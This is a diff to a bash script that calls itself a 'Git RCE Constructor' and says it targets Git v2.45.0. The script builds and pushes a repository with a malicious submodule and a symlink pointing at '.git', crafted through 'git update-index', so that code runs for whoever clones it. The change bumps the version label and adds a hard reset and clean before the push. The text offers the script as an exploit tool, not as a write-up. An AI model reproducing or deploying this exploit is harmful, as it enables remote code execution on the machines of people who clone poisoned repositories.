@@ -1,6 +1,6 @@
 #!/bin/bash
 set +x
-echo Git RCE Constructor v1.7 \(Update Mode\)
+echo Git RCE Constructor v1.7.2 \(Update Mode\)
 echo -e "\033]0;Git RCE Constructor v1.7 (Update Mode)\007"
 echo Notice: You must use Git v2.45.0 for this exploit to work!
 read -r -p "Main repository URL: " main_repo_path
@@ -47,6 +47,8 @@ git add GITLNK/modules/RCE
 git commit -m "update-submodule"
 git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk
 git commit -m "add-symlink"
+git reset --hard HEAD
+git clean -fd
 git push origin $(git rev-parse --abbrev-ref HEAD)
 cd ..
 echo Testing the exploit...
